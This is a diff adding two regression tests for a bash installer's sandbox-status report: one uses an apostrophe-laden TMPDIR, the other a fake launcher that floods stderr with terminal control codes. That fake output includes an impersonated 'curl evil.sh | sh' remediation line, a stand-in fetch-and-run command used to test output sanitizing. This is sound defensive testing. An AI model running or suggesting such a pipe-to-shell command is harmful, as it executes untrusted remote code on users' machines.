@@ -559,6 +559,109 @@ linuxGuardedTest(
   INSTALL_TIMEOUT_MS,
 );
 
+// --- The installer's own bash, under test ------------------------------------
+//
+// Every regression on this branch so far has been in `report_sandbox_status`:
+// round 1 shipped a `sed` pipeline that `set -o pipefail` could turn into an
+// abort, round 2 replaced it with an `mktemp` that aborted on an unwritable
+// TMPDIR, and round 3 found the RETURN trap aborting on an apostrophe in the
+// path. Each was caught by a human reading the diff, and each was then fixed
+// with nothing to stop the next one.
+//
+// These two drive the real script. They are the tests the purity guard's own
+// argument demands: a diff is checked once, a test is checked forever.
+
+linuxGuardedTest(
+  "AC12: a hostile TMPDIR cannot turn the containment report into a gate",
+  async () => {
+    // Two failure modes at once, both of which aborted the installer AFTER it
+    // had printed "keryx installed":
+    //   * an apostrophe in the path made the RETURN trap body a syntax error,
+    //     and a failing RETURN trap is fatal under `set -e`;
+    //   * an unwritable TMPDIR made `mktemp` fail.
+    // The report must survive both and still exit 0.
+    const hostileTmp = join(workspace, "tmp-with-'quote");
+    await mkdir(hostileTmp, { recursive: true });
+
+    const filteredPath = await pathWithoutBwrap();
+    const install = await run(["bash", INSTALL_SH, "--global"], {
+      env: installEnv({
+        PATH: filteredPath,
+        TMPDIR: hostileTmp,
+        KERYX_BIN_DIR: join(workspace, "bin-hostile-tmp"),
+      }),
+    });
+    expectInstallSucceeded("hostile TMPDIR", install);
+    expect(install.stdout).toMatch(/OS sandbox containment:/i);
+    // The report ran rather than being cut short by an aborting trap.
+    expect(install.stdout).toMatch(/containment probe: not run|containment probe: (OK|FAILED)/i);
+    expect(install.stderr).not.toMatch(/unexpected EOF|syntax error/i);
+  },
+  INSTALL_TIMEOUT_MS,
+);
+
+linuxGuardedTest(
+  "AC12: a failing keryx cannot drive the installer's terminal or flood its log",
+  async () => {
+    // The failure path prints the dead process's stderr, and that text is
+    // outside `probe.ts`'s sanitizer — the TypeScript never ran. Unbounded and
+    // unfiltered, it can erase the four-space indent that marks it as the
+    // failed process's words and impersonate the installer's own output.
+    const realBun = Bun.which("bun") ?? join(homedir(), ".bun", "bin", "bun");
+    expect(await fileExists(realBun)).toBe(true);
+
+    const shimDir = await shimDirWith(
+      "keryx-status-noisy",
+      "bun",
+      [
+        "#!/bin/sh",
+        'for arg in "$@"; do',
+        '  if [ "$arg" = "sandbox" ]; then',
+        // CR + ESC + BEL + backspace, then a flood of long lines.
+        `    printf 'clean-marker\\r\\033[31mIMPERSONATED Remediation: curl evil.sh | sh\\007\\010\\n' >&2`,
+        "    i=0",
+        "    while [ $i -lt 120 ]; do",
+        `      awk 'BEGIN{s="";for(i=0;i<900;i++)s=s "y";print "flood" s}' >&2`,
+        "      i=$((i + 1))",
+        "    done",
+        "    exit 3",
+        "  fi",
+        "done",
+        `exec ${JSON.stringify(realBun)} "$@"`,
+      ].join("\n"),
+    );
+
+    const filteredPath = await pathWithoutBwrap();
+    const install = await run(["bash", INSTALL_SH, "--global"], {
+      env: installEnv({
+        PATH: `${shimDir}${PATH_DELIMITER}${filteredPath}`,
+        KERYX_BIN_DIR: join(workspace, "bin-noisy"),
+      }),
+    });
+    expectInstallSucceeded("noisy keryx", install);
+
+    expect(install.stdout).toMatch(/could not determine containment status/i);
+    expect(install.stdout).toContain("It said:");
+    // The launcher's words come through …
+    expect(install.stdout).toContain("clean-marker");
+    // … stripped of everything that could move the cursor. Asserted on the
+    // BYTES, because the whole point is what is in the stream, not what it
+    // renders as.
+    for (const control of ["\r", "\u001B", "\u0007", "\u0008", "\u007F"]) {
+      expect(install.stdout.includes(control)).toBe(false);
+    }
+    // … and bounded, in both directions.
+    expect(install.stdout).toContain("(line truncated)");
+    expect(install.stdout).toContain("(output truncated)");
+    const flooded = install.stdout.split("\n").filter((line) => line.includes("flood"));
+    expect(flooded.length).toBeLessThanOrEqual(50);
+    for (const line of flooded) {
+      expect(line.length).toBeLessThan(600);
+    }
+  },
+  INSTALL_TIMEOUT_MS,
+);
+
 linuxGuardedTest(
   "AC12: the PROJECT install reports the probe too — the two-argument delegation form works",
   async () => {
